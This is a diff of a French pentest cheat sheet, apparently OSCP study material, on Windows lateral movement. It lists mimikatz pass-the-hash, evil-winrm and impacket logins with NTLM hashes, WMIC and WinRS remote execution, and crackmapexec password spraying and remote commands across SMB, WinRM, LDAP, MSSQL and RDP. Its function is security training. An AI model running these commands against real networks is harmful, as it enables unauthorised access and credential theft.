@@ -10,18 +10,15 @@ Référence des accès distants et protocoles entre hôtes Windows.
 
 ## Techniques et préparation
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `powershell` pour la rubrique « Techniques et préparation ».
 
 ```powershell
 powershell -ExecutionPolicy Bypass -File [script].ps1
 ```
 
 
-```text
-crackmapexec
-```
-
+Commande `mimikatz` pour la rubrique « Techniques et préparation ».
 
 ```powershell
 mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell
@@ -31,20 +28,19 @@ mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /ru
 ```
 
 
-## From Kali
-
-Commandes, paramètres et exemples associés à cette technique.
-
-
 ### Evil-WinRM
 
 Observer les permissions et la configuration de Windows.
 
 
+Commande `evil-winrm` pour la rubrique « Evil-WinRM ».
+
 ```bash
 evil-winrm -u <username> -p <password> -i <target_ip>
 ```
 
+
+Commande `evil-winrm` pour la rubrique « Evil-WinRM ».
 
 ```bash
 # Use -S option to ignore SSL validation for insecure systems.
@@ -56,13 +52,15 @@ evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTL
 
 ### PsExec
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `impacket-psexec` pour la rubrique « PsExec ».
 
 ```bash
 impacket-psexec <username>:<password>@<target_ip>
 ```
 
+
+Commande `impacket-psexec` pour la rubrique « PsExec ».
 
 ```bash
 impacket-psexec <username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
@@ -73,13 +71,15 @@ impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:
 
 ### VMIExec
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `impacket-wmiexec` pour la rubrique « VMIExec ».
 
 ```bash
 impacket-wmiexec <username>:<password>@<target_ip>
 ```
 
+
+Commande `impacket-wmiexec` pour la rubrique « VMIExec ».
 
 ```bash
 impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <username>@<target_ip>
@@ -88,25 +88,26 @@ impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>
 ```
 
 
-## From Windows
+## Depuis Windows
 
 Observer les permissions et la configuration de Windows.
 
 
 ### DCOM (Distributed Component Object Model)
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `get-itemproperty` pour la rubrique « DCOM (Distributed Component Object Model) ».
 
 ```powershell
 Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
 ```
 
 
-```powershell
-Invoke-Command
-```
+**Paramètres et repères :**
+`Invoke-Command`  
 
+
+Exemple technique pour la rubrique « DCOM (Distributed Component Object Model) ».
 
 ```powershell
 $targetIP = "<target_ip>"  # Replace with the actual target IP
@@ -119,10 +120,11 @@ Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ip
 ```
 
 
-```text
-vmiexec
-```
+**Paramètres et repères :**
+`vmiexec`  
 
+
+Commande `wmiexec.py` pour la rubrique « DCOM (Distributed Component Object Model) ».
 
 ```bash
 wmiexec.py <domain>/<username>:<password>@<target_ip>
@@ -133,8 +135,8 @@ wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
 
 ### PsExec
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `psexec.exe` pour la rubrique « PsExec ».
 
 ```bash
 psexec.exe \\<target_ip> -u <username> -p <password> cmd
@@ -145,6 +147,8 @@ psexec.exe \\<target_ip> -u <username> -p <password> cmd
 
 Observer les permissions et la configuration de Windows.
 
+
+Exemple technique pour la rubrique « WinRM ».
 
 ```powershell
 $username = '<username>';
@@ -157,8 +161,8 @@ New-PSSession -ComputerName <target_ip> -Credential $credential;
 
 ### WinRS
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `winrs` pour la rubrique « WinRS ».
 
 ```powershell
 winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
@@ -167,8 +171,8 @@ winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
 
 ### WMIC
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Commande `wmic` pour la rubrique « WMIC ».
 
 ```powershell
 wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"
@@ -185,15 +189,11 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-```text
---delay
-```
+**Paramètres et repères :**
+`--delay` (délai) · `--max-retries` (limite des tentatives)  
 
 
-```text
---max-retries
-```
-
+Énumérer les informations SMB ou RPC.
 
 ```bash
 # Check policies with a tool like rpcclient
@@ -207,61 +207,58 @@ crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Use CrackMapExec's --target option to narrow focus
 crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwords.txt
 ```
 
 
-```text
---local-auth
-```
+**Paramètres et repères :**
+`--local-auth` (authentification locale)  
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> > output.log
 ```
 
 
-```text
-enum4linux
-```
-
-
-```text
-crackmapexec
-```
-
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec smb <IP_list>.txt -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
 ```
 
 
-```text
+Examiner le service distant avec les paramètres fournis.
+
+```bash
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --users
 ```
 
 
-```text
+Examiner le service distant avec les paramètres fournis.
+
+```bash
 crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>
 ```
 
+
+Examiner les ports et les services avec Nmap.
 
 ```bash
 nmap -p 5985,1433,445,3389 <TARGET_IP>
 ```
 
 
-```text
--p
-```
+**Paramètres et repères :**
+`-p` · `-H`  
 
 
-```text
--H
-```
-
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Test both passwords and NTLM hashes
@@ -274,6 +271,8 @@ crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOM
 Examiner les objets, les droits et les services du domaine.
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Test a single password across all users in the domain
 crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray --delay 5
@@ -283,17 +282,23 @@ crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --sp
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com)
 crackmapexec smb <SUBDOMAIN_IP> -d <SUBDOMAIN_NAME> -u users.txt -p <PASSWORD>
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Test credentials against local accounts not part of the domain
 crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Execute a command on a remote machine with valid credentials
@@ -309,6 +314,8 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "w
 Observer les permissions et la configuration de Windows.
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Test credentials on the main domain via WinRM
 crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --spray --delay 5
@@ -321,6 +328,8 @@ crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Enumerate subdomains with valid credentials and test credentials (for example a workstation specific domain, like workstation1.domain.com). Authenticate on a subdomain
 crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
@@ -330,6 +339,8 @@ crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SU
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Authenticate with a local user account
 crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
@@ -338,6 +349,8 @@ crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
 crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Execute a command remotely
@@ -353,6 +366,8 @@ crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x 
 Examiner les objets, les droits et les services du domaine.
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Gain a shell using valid credentials
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method smbexec
@@ -361,6 +376,8 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method smbexec
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Execute a remote command
@@ -373,8 +390,8 @@ crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "w
 
 ### VMIExec
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Gain a shell using valid credentials
@@ -390,6 +407,8 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exe
 Examiner les objets, les droits et les services du domaine.
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Authenticate and enumerate users on the main domain
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
@@ -398,6 +417,8 @@ crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Enumerate users on a subdomain
@@ -413,6 +434,8 @@ crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUB
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Test main domain credentials on an MSSQL server
 crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
@@ -422,6 +445,8 @@ crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAI
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Test credentials on a subdomain MSSQL server
 crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
@@ -430,6 +455,8 @@ crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME
 crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Test local user credentials on MSSQL
@@ -442,8 +469,8 @@ crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 
 ### RDP
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Test credentials against an RDP service on the main domain
@@ -454,6 +481,8 @@ crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_
 ```
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 # Test credentials on an RDP service in a subdomain
 crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
@@ -462,6 +491,8 @@ crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
 crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
 ```
 
+
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 # Authenticate to RDP with local credentials
@@ -477,6 +508,8 @@ crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
 ```
@@ -484,8 +517,8 @@ crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
 
 ### SSH
 
-Commandes, paramètres et exemples associés à cette technique.
 
+Examiner le service distant avec les paramètres fournis.
 
 ```bash
 crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
@@ -497,11 +530,14 @@ crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
 Examiner les entrées et les réponses de l'application web.
 
 
+Examiner le service distant avec les paramètres fournis.
+
 ```bash
 crackmapexec http <TARGET_IP> -u <USERNAME> -p <PASSWORD>
 ```
 
-
 ---
 
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
+
+<!-- refined-oscp -->
